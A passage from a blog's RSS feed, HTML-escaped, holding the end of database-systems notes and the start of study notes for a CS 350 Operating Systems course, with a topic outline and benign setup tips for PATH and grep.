        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Distributed, multi-dimensional, persistent, sparse, sorted map&lt;/li&gt;
&lt;li&gt;Data model: { row and column }&lt;/li&gt;
&lt;li&gt;Transactional atomicity only for single row update&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;graph-dbmss&#34; &gt;Graph DBMSs
&lt;span&gt;
    &lt;a href=&#34;#graph-dbmss&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Many applications (Fraud detection, recommendation engines, AI knowledge gaps, social networks)&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;neo4j&#34; &gt;Neo4J
&lt;span&gt;
    &lt;a href=&#34;#neo4j&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;Property graphs
&lt;ul&gt;
&lt;li&gt;Vertices, edges, labels, and properties&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Linked list on disk&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>CS 350 Operating Systems</title>
      <link>https://blog.elijahlopez.ca/posts/university/cs-350-operating-systems/</link>
      <pubDate>Tue, 10 Jan 2023 14:56:10 -0500</pubDate>
      
      <guid>https://blog.elijahlopez.ca/posts/university/cs-350-operating-systems/</guid>
      <description>&lt;!-- &lt;img class=equation-tall src=&#34;https://latex.codecogs.com/svg.image?QI=&#34;&gt; --&gt;
&lt;!-- - [Course website](https://student.cs.uwaterloo.ca/~cs350/) --&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://student.cs.uwaterloo.ca/~cs350/W23/reading.shtml&#34;&gt;Course website&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://student.cs.uwaterloo.ca/~cs350/common/old-exams/&#34;&gt;Past midterms&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div&gt;
    &lt;h2&gt;Table of Contents&lt;/h2&gt;
    &lt;nav id=&#34;TableOfContents&#34;&gt;
  &lt;ul&gt;
    &lt;li&gt;&lt;a href=&#34;#concepts&#34;&gt;Concepts&lt;/a&gt;&lt;/li&gt;
    &lt;li&gt;&lt;a href=&#34;#course-topics&#34;&gt;Course Topics&lt;/a&gt;&lt;/li&gt;
    &lt;li&gt;&lt;a href=&#34;#assignment-helpers&#34;&gt;Assignment Helpers&lt;/a&gt;
      &lt;ul&gt;
        &lt;li&gt;&lt;a href=&#34;#cs-350-cli&#34;&gt;CS 350 CLI&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#how-to-add-to-path&#34;&gt;How to add to PATH&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#finding-stuff-in-the-kernal-code&#34;&gt;Finding stuff in the kernal code&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#setting-up-on-a-new-machine&#34;&gt;Setting up on a new Machine&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#building-the-kernel&#34;&gt;Building the kernel&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#running-the-kernel-on-a-simulator&#34;&gt;Running the kernel on a simulator&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#debugging&#34;&gt;Debugging&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#working-locally&#34;&gt;Working locally&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#submitting-assignments&#34;&gt;Submitting Assignments&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#readelf&#34;&gt;Readelf&lt;/a&gt;&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
    &lt;li&gt;&lt;a href=&#34;#processes&#34;&gt;Processes&lt;/a&gt;
      &lt;ul&gt;
        &lt;li&gt;&lt;a href=&#34;#abstractions&#34;&gt;Abstractions&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#sections&#34;&gt;Sections&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#creating-processes&#34;&gt;Creating processes&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#pipes&#34;&gt;Pipes&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#implementing-processes&#34;&gt;Implementing Processes&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#context-switch&#34;&gt;Context Switch&lt;/a&gt;&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
    &lt;li&gt;&lt;a href=&#34;#threads&#34;&gt;Threads&lt;/a&gt;
      &lt;ul&gt;
        &lt;li&gt;&lt;a href=&#34;#posix-thread-api&#34;&gt;POSIX Thread API&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#limitations-of-kernel-threads&#34;&gt;Limitations of Kernel Threads&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#go-language-routines&#34;&gt;Go Language Routines&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#implementing-threads-in-os161&#34;&gt;Implementing threads in OS/161&lt;/a&gt;&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
    &lt;li&gt;&lt;a href=&#34;#concurrency&#34;&gt;Concurrency&lt;/a&gt;
      &lt;ul&gt;
        &lt;li&gt;&lt;a href=&#34;#sequential-consistency&#34;&gt;Sequential Consistency&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#x86-consistency&#34;&gt;x86 Consistency&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#x86-atomicity&#34;&gt;x86 Atomicity&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#petersons-solution&#34;&gt;Peterson&amp;rsquo;s Solution&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#mutexes&#34;&gt;Mutexes&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#condition-variables&#34;&gt;Condition Variables&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#semaphores&#34;&gt;Semaphores&lt;/a&gt;&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
    &lt;li&gt;&lt;a href=&#34;#synchronization&#34;&gt;Synchronization&lt;/a&gt;
      &lt;ul&gt;
        &lt;li&gt;&lt;a href=&#34;#motivation&#34;&gt;Motivation&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#ordering-requirements&#34;&gt;Ordering requirements&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#mips-spinlocks&#34;&gt;MIPS Spinlocks&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#atomics-c11&#34;&gt;Atomics C11&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#cache-coherence&#34;&gt;Cache Coherence&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#multicore-caches&#34;&gt;Multicore Caches&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#3-state-coherence-protocol-msi&#34;&gt;3-State Coherence Protocol (MSI)&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#core-and-bus-actions&#34;&gt;Core and Bus Actions&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#multithreaded-design&#34;&gt;Multithreaded Design&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#deadlocks&#34;&gt;Deadlocks&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#solving-deadlocks&#34;&gt;Solving Deadlocks&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#wait-channels&#34;&gt;Wait Channels&lt;/a&gt;&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
    &lt;li&gt;&lt;a href=&#34;#system-calls&#34;&gt;System Calls&lt;/a&gt;
      &lt;ul&gt;
        &lt;li&gt;&lt;a href=&#34;#privilege-modes&#34;&gt;Privilege Modes&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#mode-transitions&#34;&gt;Mode Transitions&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#system-call-handling&#34;&gt;System Call Handling&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#hardware-handling-in-mips-r3000&#34;&gt;Hardware Handling in MIPS R3000&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#mips-review&#34;&gt;MIPS Review&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#application-binary-interface&#34;&gt;Application Binary Interface&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#execution-contexts&#34;&gt;Execution Contexts&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#preemption&#34;&gt;Preemption&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#process-context-switch&#34;&gt;Process Context Switch&lt;/a&gt;&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
    &lt;li&gt;&lt;a href=&#34;#virtual-memory-hardware&#34;&gt;Virtual Memory Hardware&lt;/a&gt;
      &lt;ul&gt;
        &lt;li&gt;&lt;a href=&#34;#sharing-memory-issues&#34;&gt;Sharing Memory Issues&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#virtual-memory-goals&#34;&gt;Virtual Memory Goals&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#virtual-memory-advantages&#34;&gt;Virtual Memory Advantages&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#load-time-linking&#34;&gt;Load-time Linking&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#base--bound-register&#34;&gt;base + bound register&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#segmentation&#34;&gt;Segmentation&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#fragmentation&#34;&gt;Fragmentation&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#paging&#34;&gt;Paging&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#mmus&#34;&gt;MMUs&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#hardware-managed-mmu&#34;&gt;Hardware Managed MMU&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#tlb&#34;&gt;TLB&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#os&#34;&gt;OS&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#software-managed-mmu&#34;&gt;Software Managed MMU&lt;/a&gt;&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
    &lt;li&gt;&lt;a href=&#34;#virtual-memory-os&#34;&gt;Virtual Memory OS&lt;/a&gt;
      &lt;ul&gt;
        &lt;li&gt;&lt;a href=&#34;#increasing-virtual-memory-by-paging&#34;&gt;Increasing Virtual Memory by Paging&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#page-buffering&#34;&gt;Page Buffering&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#page-allocation&#34;&gt;Page Allocation&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#thrashing&#34;&gt;Thrashing&lt;/a&gt;&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
    &lt;li&gt;&lt;a href=&#34;#scheduling&#34;&gt;Scheduling&lt;/a&gt;
      &lt;ul&gt;
        &lt;li&gt;&lt;a href=&#34;#cpu-scheduling&#34;&gt;CPU Scheduling&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#first-come-first-served&#34;&gt;First Come First Served&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#bursts-of-computation-and-io&#34;&gt;Bursts of Computation and I/O&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#shortest-job-first&#34;&gt;Shortest Job First&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#round-robin&#34;&gt;Round Robin&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#time-quantum&#34;&gt;Time Quantum&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#priority-scheduling&#34;&gt;Priority Scheduling&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#multilevel-feedback-queue&#34;&gt;Multilevel Feedback Queue&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#priority-donation&#34;&gt;Priority Donation&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#borrowed-virtual-time-scheduler&#34;&gt;Borrowed Virtual Time Scheduler&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#sleep--wakeup&#34;&gt;Sleep / Wakeup&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#real-time-threads&#34;&gt;Real-time Threads&lt;/a&gt;&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
    &lt;li&gt;&lt;a href=&#34;#io&#34;&gt;I/O&lt;/a&gt;
      &lt;ul&gt;
        &lt;li&gt;&lt;a href=&#34;#memory-and-io-buses&#34;&gt;Memory and I/O buses&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#memory-types&#34;&gt;Memory Types&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#device-communication&#34;&gt;Device Communication&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#driver-architecture&#34;&gt;Driver Architecture&lt;/a&gt;&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
    &lt;li&gt;&lt;a href=&#34;#disks-io-subtopic&#34;&gt;Disks (I/O Subtopic)&lt;/a&gt;
      &lt;ul&gt;
        &lt;li&gt;&lt;a href=&#34;#disk-positioning-system&#34;&gt;Disk Positioning System&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#seeking&#34;&gt;Seeking&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#sectors&#34;&gt;Sectors&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#disk-interface&#34;&gt;Disk Interface&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#buses&#34;&gt;Buses&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#scsi-requests&#34;&gt;SCSI Requests&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#scsi-exceptions&#34;&gt;SCSI Exceptions&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#disk-performance&#34;&gt;Disk Performance&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#disk-scheduling&#34;&gt;Disk Scheduling&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#flash-memory&#34;&gt;Flash Memory&lt;/a&gt;&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
    &lt;li&gt;&lt;a href=&#34;#filesystem&#34;&gt;Filesystem&lt;/a&gt;
      &lt;ul&gt;
        &lt;li&gt;&lt;a href=&#34;#files-name-bytes-on-disk&#34;&gt;Files: name bytes on disk&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#mappings&#34;&gt;Mappings&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#intuitions&#34;&gt;Intuitions&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#common-patterns&#34;&gt;Common Patterns&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#dos-fs&#34;&gt;DOS FS&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#indexed-files&#34;&gt;Indexed files&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#multi-level-indexed-files&#34;&gt;Multi-level indexed files&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#directories&#34;&gt;Directories&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#hard-and-soft-links&#34;&gt;Hard and soft links&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#fast-file-system-ffs&#34;&gt;Fast File System (FFS)&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#log-structured-file-system&#34;&gt;Log-Structured File System&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#metadata-synchronously&#34;&gt;Metadata Synchronously&lt;/a&gt;&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
    &lt;li&gt;&lt;a href=&#34;#the-slab-allocator&#34;&gt;The Slab Allocator&lt;/a&gt;
      &lt;ul&gt;
        &lt;li&gt;&lt;a href=&#34;#object-caching&#34;&gt;Object Caching&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#questions&#34;&gt;Questions&lt;/a&gt;&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
    &lt;li&gt;&lt;a href=&#34;#the-fast-file-system&#34;&gt;The Fast File System&lt;/a&gt;&lt;/li&gt;
  &lt;/ul&gt;
&lt;/nav&gt;
&lt;/div&gt;

&lt;h2 id=&#34;concepts&#34; &gt;Concepts
&lt;span&gt;
    &lt;a href=&#34;#concepts&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;Operating Systems&lt;/li&gt;
&lt;li&gt;Distributed Systems&lt;/li&gt;
&lt;li&gt;Networking&lt;/li&gt;
&lt;li&gt;Internet of Things&lt;/li&gt;
&lt;li&gt;Computer Architecture&lt;/li&gt;
&lt;li&gt;Embedded Systems&lt;/li&gt;
&lt;li&gt;Database Systems&lt;/li&gt;
&lt;li&gt;Systems and Machine Learning&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;course-topics&#34; &gt;Course Topics
&lt;span&gt;
    &lt;a href=&#34;#course-topics&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;Threads &amp;amp; Processes&lt;/li&gt;
&lt;li&gt;Concurrency &amp;amp; Synchronization&lt;/li&gt;
&lt;li&gt;Scheduling&lt;/li&gt;
&lt;li&gt;Virtual Memory&lt;/li&gt;
&lt;li&gt;I/O&lt;/li&gt;
&lt;li&gt;Disks, File systems, Network file systems&lt;/li&gt;
&lt;li&gt;Protection &amp;amp; Security&lt;/li&gt;
&lt;li&gt;Unix referenced as an example&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;assignment-helpers&#34; &gt;Assignment Helpers
&lt;span&gt;
    &lt;a href=&#34;#assignment-helpers&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;h3 id=&#34;cs-350-cli&#34; &gt;CS 350 CLI
&lt;span&gt;
    &lt;a href=&#34;#cs-350-cli&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;File hierarchy&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;cs350 (CWD)
&lt;ul&gt;
&lt;li&gt;os161&lt;/li&gt;
&lt;li&gt;userspace
&lt;ul&gt;
&lt;li&gt;ASSTUSERX&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://gist.github.com/elibroftw/36d18406d6be775e2c52af9d19571c42&#34;&gt;cs350_cli.py&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;how-to-add-to-path&#34; &gt;How to add to PATH
&lt;span&gt;
    &lt;a href=&#34;#how-to-add-to-path&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;In your &lt;code&gt;.bashrc&lt;/code&gt;, add &lt;code&gt;PATH=&amp;quot;$PATH:path&amp;quot;&lt;/code&gt;. For some reason, my &lt;code&gt;.bashrc&lt;/code&gt; file keeps getting wiped.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#40ffff&#34;&gt;PATH&lt;/span&gt;=&lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#40ffff&#34;&gt;$PATH&lt;/span&gt;&lt;span style=&#34;color:#ed9d13&#34;&gt;:/u/cs350/sys161/bin:/u/cs350/bin&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;finding-stuff-in-the-kernal-code&#34; &gt;Finding stuff in the kernal code
&lt;span&gt;
    &lt;a href=&#34;#finding-stuff-in-the-kernal-code&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;Since you may not have vscode open for the kernel but your entire linux environment, grep may be more efficient.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;grep -rnw . -e &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#39;pattern&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This is the command assumes you are in the os161-X.YZ directory.&lt;/p&gt;
&lt;h3 id=&#34;setting-up-on-a-new-machine&#34; &gt;Setting up on a new Machine
&lt;span&gt;
